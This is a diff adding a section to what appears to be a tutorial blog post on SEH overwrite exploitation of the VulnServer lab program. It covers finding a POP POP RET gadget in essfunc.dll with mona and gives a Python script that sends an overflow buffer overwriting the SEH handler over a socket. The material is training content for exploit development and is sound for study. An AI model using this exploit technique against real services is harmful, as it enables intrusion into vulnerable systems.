@@ -652,31 +652,139 @@ Checking the memory dump we can see that we actually have zero bad chars besides
 
 
 
+### [](#header-3) Finding POP POP RET Instruction
+
+
+
+I have already talked in detail about the `POP POP RET` sequence of instructions and why it's important so I will stick to practical and let the section above `A Mention on POP POP RET` do the talking. 
+
+
+
+Let's first find an applicable module which will contain this sequence of instructions using the below command with **mona**
+
+
+
+```python
+!mona seh
+```
+
+
+
+Here an obvious choice stands out `efffunc.dll` as it is not compiled with any security mechanisms such as `SafeSEH`  or `ASLR` 
+
+
+
+Let's double click the module and just verify the assembly instructions and make sure this is what we need.
+
+
+
+<p align = "center">
+<img src = "https://i.imgur.com/jYmakpn.png">
+</p>
 
 
 
 
 
+Perfect, we have a `POP EBX` `POP EBP` and `RETN` instruction. This is exactly what we need `POP POP RET`
+
+
+
+For this part, I recommened you place a breakpoint at the start of your `POP POP RET` function so you can step-through the next part to understand what happens, you can this by simply double-clicking your selected module in **mona** followed by pressing `F2` on the `POP EBX` instruction. 
+
+
+
+Now I will amend my python script to overwrite the `seh` variable with the value of my `POP POP RET` instruction just like below.
+
+
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+
+
+nseh = "B"*4
+seh = "\xb4\x10\x50\x62" #0x625010b4 pop,pop,ret
+
+
+
+buffer = "A" * 3515
+print "[*] Starting to Fuzz GMON with %s bytes" %len(buffer) + " A's"
+buffer += nseh #BBBB
+buffer += seh #CCCC
+junk = "D"*(5000-len(buffer))
+buffer += junk #Bunch of D"s to fill remaining space
+
+print "[*] Starting to Fuzz GMON with everything containing %s bytes" %len(buffer)
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect(('bof.local',9999))
+print "[*] Connected to bof.local on Port 9999"
+s.send(('GMON /.:/' + buffer))
+s.close()
+print "[*] Finished Fuzzing GMON with %s bytes" %len(buffer)
+```
+
+
+
+Let's run this script and jump over to **Immunity** again and see what has happened.
+
+
+
+Before we check out the stack or memory dump let's quickly check the **SEH Chain**
+
+
+
+
+<p align = "center">
+<img src = "https://i.imgur.com/VPMMmtu.png">
+</p>
 
 
 
 
 
+Perfect, the **SE Handler** is pointing to our `POP POP RET` instruction from our selected DLL, this case `0x625010B4` -> `essfunc.dll`
 
 
 
 
 
+A quick analysis of the stack and memory dump also all looks okay.
+
+<p align = "center">
+<img src = "https://i.imgur.com/wLA8gUo.png">
+</p>
+
+
+
+Of course as we are merely piecing everything together at the moment the application is in a crashed state, however let's send our pass our exception to the program with `Shift+F9` which send the value of **SE Handler** on the stack to the **EIP Register** which in turn will jump to our `POP POP RET` instruction.
 
 
 
 
+<p align = "center">
+<img src = "https://i.imgur.com/n888gkn.png".
+</p>
+
+
+
+Perfect! Exactly what we needed, our **SE Handler** value of `625010B4` in pushed to `EIP` which in turn is our `POP POP RET` instructions as shown at the top left.
+
+
+
+Now if we step through by pressing `F7` we will first `POP EBX` `POP EBP` and finally `RETN` which will take us to the value of **nSEH** - In this case `BBBB`
 
 
 
 
+<p align = "center">
+<img src = "https://i.imgur.com/6MReMKJ.png">
+</p>
 
 
+
+As you can see **EIP** points too `024FFFC4` which relates to the instruction at the top left, looking at said instructions we can see ` 42 42 42 42` which represents our `"B"*4` 
 
 
 
